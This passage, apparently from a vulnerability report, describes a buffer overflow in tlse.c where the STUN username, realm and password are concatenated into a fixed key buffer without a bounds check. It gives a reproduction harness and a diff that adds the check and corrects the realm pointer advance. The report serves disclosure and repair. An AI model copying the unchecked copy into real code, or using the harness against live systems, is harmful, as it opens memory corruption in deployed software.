│  library's own entry point:\n\n```c\ntls_init();\nchannel =                  │
│  tls_peerconnection_context(0, verify_cb,                                    │
│  NULL);\ntls_peerconnection_connect(channel,                                 │
│  NULL);\ntls_peerconnection_iterate(channel, (unsigned char *)stun, len,     │
│  addr, 0, 0, NULL, &validate);\n```                                          │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: tlse.c:13201-13214                                            │
│    Root cause: unbounded concatenation into key[0x4CE], plus wrong pointer   │
│  advance for REALM                                                           │
│    Fix:                                                                      │
│    -                 if ((realm) && (realm_len > 0)) {                       │
│                      ptr = key;                                              │
│                      memcpy(ptr, username, username_len);                    │
│                      ptr += username_len;                                    │
│                                                                              │
│                      *ptr = ':';                                             │
│                      ptr ++;                                                 │
│                                                                              │
│                      if ((realm) && (realm_len > 0)) {                       │
│                          memcpy(ptr, realm, realm_len);                      │
│                          ptr += username_len;                                │
│                          *ptr = ':';                                         │
│                          ptr ++;                                             │
│                      }                                                       │
│    +                 if ((realm) && (realm_len > 0)) {                       │
│                      if ((unsigned int)(username_len + realm_len + pwd_len   │
│  + 3) > sizeof(key))                                                         │
│                          return TLS_BROKEN_PACKET;                           │
│                      ptr = key;                                              │
│                      memcpy(ptr, username, username_len);                    │
│                      ptr += username_len;                                    │
│                                                                              │
│                      *ptr = ':';                                             │
│                      ptr ++;                                                 │
│                                                                              │
│                      if ((realm) && (realm_len > 0)) {                       │
│                          memcpy(ptr, realm, realm_len);                      │
│                          ptr += realm_len;                                   │
│                          *ptr = ':';                                         │
│                          ptr ++;                                             │
│                      }                                                       │
│                                                                              │
│  Remediation                                                                 │
│  Compute the total length of the concatenated key (username + realm +        │
│  password + separators + terminator) and reject the message with             │
│  TLS_BROKEN_PACKET when it cannot fit in the destination buffer, before      │
│  performing any copy. Also correct the pointer advance for the REALM         │
│  attribute, which currently uses the USERNAME length and therefore writes    │
│  the separator and password at the wrong offsets. Alternatively, build the   │
│  key with a length-tracking helper that cannot overrun, and lower the        │
│  per-attribute limits so their sum is provably within the buffer.            │
│                                                                              │
